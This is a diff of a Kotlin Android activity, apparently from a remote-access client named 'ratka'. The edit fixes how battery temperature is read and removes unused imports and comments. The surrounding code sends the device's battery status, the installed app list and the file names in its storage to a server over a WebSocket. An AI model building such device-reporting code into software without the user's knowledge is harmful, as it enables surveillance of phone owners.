@@ -2,7 +2,7 @@ package com.ratka.client
 
 import android.content.Context
 import android.content.Intent
-import android.media.AudioManager
+import android.content.IntentFilter
 import android.media.RingtoneManager
 import android.net.Uri
 import android.os.BatteryManager
@@ -20,7 +20,6 @@ import okhttp3.*
 import org.json.JSONArray
 import org.json.JSONObject
 import java.util.concurrent.TimeUnit
-import kotlin.random.Random
 
 class MainActivity : AppCompatActivity() {
     private val client = OkHttpClient.Builder()
@@ -82,8 +81,12 @@ class MainActivity : AppCompatActivity() {
     private fun sendBatteryInfo(ws: WebSocket) {
         val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
         val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
-        val temp = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_TEMPERATURE) / 10.0
+        
+        val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
+        val batteryStatus: Intent? = registerReceiver(null, ifilter)
+        val temp = (batteryStatus?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0
         val status = if (bm.isCharging) "Заряжается" else "От батареи"
+
         ws.send(JSONObject().apply {
             put("type", "battery")
             put("level", level)
@@ -125,12 +128,12 @@ class MainActivity : AppCompatActivity() {
         val apps = pm.getInstalledApplications(0).map { it.packageName }.filter { !it.startsWith("android.") }
         ws.send(JSONObject().apply {
             put("type", "apps")
-            put("list", JSONArray(apps.take(30))) // первые 30 штук
+            put("list", JSONArray(apps.take(30)))
         }.toString())
     }
 
     private fun sendDownloads(ws: WebSocket) {
-        val dir = getExternalFilesDir(null) // или Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
+        val dir = getExternalFilesDir(null)
         val files = dir?.listFiles()?.map { it.name } ?: emptyList()
         ws.send(JSONObject().apply {
             put("type", "files")
